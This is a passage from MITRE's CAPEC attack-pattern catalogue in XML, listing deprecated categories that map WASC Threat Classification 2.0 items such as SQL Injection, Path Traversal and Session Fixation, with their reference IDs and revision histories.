               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="350" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-17 - Improper Filesystem Permissions" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Improper Filesystem Permissions</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-293" Section="WASC-17 - Improper Filesystem Permissions" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="351" Name="DEPRECATED: WASC-18 - Credential/Session Prediction" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Credential/Session Prediction</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-18 - Credential/Session Prediction</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="352" Name="DEPRECATED: WASC-19 - SQL Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item SQL Injection</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-19 - SQL Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="353" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-20 - Improper Input Handling" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Improper Input Handling</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-108" Section="WASC-20 - Improper Input Handling" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="354" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-21 - Insufficient Anti-automation" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insufficient Anti-automation</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-297" Section="WASC-21 - Insufficient Anti-automation" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="355" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-22 - Improper Output Handling" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Improper Output Handling</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-298" Section="WASC-22 - Improper Output Handling" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="356" Name="DEPRECATED: WASC-23 - XML Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item XML Injection</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-23 - XML Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="357" Name="DEPRECATED: WASC-24 - HTTP Request Splitting" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item HTTP Request Splitting</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-24 - HTTP Request Splitting</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="358" Name="DEPRECATED: WASC-25 - HTTP Response Splitting" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item HTTP Response Splitting</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-25 - HTTP Response Splitting</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="359" Name="DEPRECATED: WASC-26 - HTTP Request Smuggling" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item HTTP Request Smuggling</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-26 - HTTP Request Smuggling</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="360" Name="DEPRECATED: WASC-27 - HTTP Response Smuggling" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item HTTP Response Smuggling</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-27 - HTTP Response Smuggling</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="361" Name="DEPRECATED: WASC-28 - Null Byte Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Null Byte Injection</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-28 - Null Byte Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="362" Name="DEPRECATED: WASC-29 - LDAP Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item LDAP Injection</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-29 - LDAP Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="363" Name="DEPRECATED: WASC-30 - Mail Command Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Mail Command Injection</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-30 - Mail Command Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="364" Name="DEPRECATED: WASC-31 - OS Commanding" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item OS Commanding</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-31 - OS Commanding</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="365" Name="DEPRECATED: WASC-32 - Routing Detour" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Routing Detour</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-32 - Routing Detour</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="366" Name="DEPRECATED: WASC-33 - Path Traversal" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Path Traversal</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-33 - Path Traversal</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="367" Name="DEPRECATED: WASC-34 - Predictable Resource Location" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Predictable Resource Location</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-34 - Predictable Resource Location</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="368" Name="DEPRECATED: WASC-35 - SOAP Array Abuse" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item SOAP Array Abuse</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-35 - SOAP Array Abuse</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="369" Name="DEPRECATED: WASC-36 - SSI Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item SSI Injection</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-36 - SSI Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="370" Name="DEPRECATED: WASC-37 - Session Fixation" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Session Fixation</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-37 - Session Fixation</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="371" Name="DEPRECATED: WASC-38 - URL Redirector Abuse" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item URL Redirector Abuse</ns0:Summary>
         <ns0:Notes>
            <ns0:Note Type="Relationship">It should be noted that the member relation to CAPEC-194 is not as clean as could be. CAPEC-194 would ideally have another child (other than CAPEC-543: Counterfeit Websites) that is specific to URL Redirection. Unlike CAPEC-543, URL Redirection does not require a counterfeit website, but rather the user to simply click a link. With that said, we have created this relationship to CAPEC-194 due to the related weakness (CWE-601), which specifically deals with URL Redirection, and will revist this at a later date.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationship_Notes, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-38 - URL Redirector Abuse</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="372" Name="DEPRECATED: WASC-39 - XPath Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item XPath Injection</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="83" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-315" Section="WASC-39 - XPath Injection" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-39 - XPath Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="373" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-40 - Insufficient Process Validation" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insufficient Process Validation</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-316" Section="WASC-40 - Insufficient Process Validation" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="374" Name="DEPRECATED: WASC-41 - XML Attribute Blowup" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item XML Attribute Blowup</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-41 - XML Attribute Blowup</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="375" Name="DEPRECATED: WASC-42 - Abuse of Functionality" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Abuse of Functionality</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-42 - Abuse of Functionality</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="376" Name="DEPRECATED: WASC-43 - XML External Entities" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item XML External Entities</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
